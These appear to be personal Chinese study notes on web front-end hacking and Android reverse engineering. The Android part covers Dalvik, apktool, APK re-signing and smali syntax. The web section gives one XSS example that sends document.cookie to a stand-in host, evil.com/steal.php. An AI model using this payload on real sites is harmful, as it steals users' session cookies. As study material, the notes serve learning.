#  学习笔记
## 1. Web前端黑客技术揭秘
### POC理解&学习
1. XSS获取敏感信息：eval(‘new Image().src=“http://www.evil.com/steal.php?c=“+escape(document.cookie)')

## 2. Android逆向学习
### 基础知识
1. Davlik Android OS的虚拟机，Dalvik基于寄存器，Java VM基于栈，二者明显区别。Davlik专属文件执行格式dex，比Java JVM运行快，内存占用少。
2. 反编译 Apktool、dex2jar+jd-gui，最终修改APK需要操作.smali文件，然后再使用Apktool将修改的文件打包成APK，再使用 jarsigner进行APK签名：jarsigner -keystore name.keystore Folder keystorealias -keypass passwd
3. Davlik中寄存器32位，64位类型（Long/Double）用2个寄存器表示，字节码2中类型：原始类型、引用类型（包括对象和数组）
	- B- - -byte
	- C- - -char
	- D- - -double
	- F- - -float
	- I- - -int
	- J- - -long
	- S- - -short
	- V- - -void
	- Z- - -boolean
	- [XXX- - -array
	- Lxxx/yyy- - -object : LpackageName/objectName$subObjectName;
4. smali函数
	1.  hello()V —\> void hello()
	2. hello(III)Z —\> boolean hello(int,int,int)
	3. hello(Z[I[ILjava/lang/String;J)Ljava/lang/String; —\> String hello(boolean,int[],int[],String,long)
5. Smali基本语法
	1. .field private isFlag:z   定义变量  
		.field button_login:Landroid/widget/Button;
	2. .method  方法
		.method protected onCreate(Landroid/os/Bundle;)V  
	3. .parameter  方法参数
		.param p1, "name"    # Ljava/lang/String;
	4. .prologue  方法开始
	5. .line 36   此方法位于36行
	6. Invoke-super  调用父函数
	7. Return-void  函数返回void
	8. Move-result v0   上面函数执行的结果赋值给v0
	9. .end method 函数结束
	10. New-instance 创建实例
	11. Input-object  对象赋值
	12. Iget-object  调用对象
	13. Invoke-static  调用静态函数
	14. Invoke-virtual  调用函数
		invoke-virtual {p1, v0}, Ljava/lang/String;-\>equals(Ljava/lang/Object;)Z  
	15. Const-string  string赋值
		const-string v0, "snow"
6. smali的条件分支
	1. If-eq vA,vB,:cond\_\*\* 如果vA和vB相等，则跳转至cond\_\*\*  
	2. If-ne（不等于）、if-lt（小于）、if-ge（大于等于）、if-gt（大于）、if-le（小于等于）
	3. If-eqz v0:cond\_\*\* 如果V0等于0，则跳转至cond
	4. If-nez（不等于0）、if-ltz、if-gtz、if-gez、if-lez
